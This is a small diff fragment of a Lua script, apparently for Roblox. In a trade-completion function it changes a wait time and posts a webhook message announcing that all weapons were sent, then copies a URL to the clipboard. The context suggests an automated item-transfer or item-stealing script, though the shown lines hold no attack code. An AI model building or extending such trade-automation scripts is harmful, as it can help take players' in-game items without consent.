@@ -240,7 +240,7 @@ local function TradeFinalizado()
     end
 
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
-task.wait(1)
+task.wait(3)
 
 -- Copiar URL automáticamente al portapapeles
 if setclipboard then
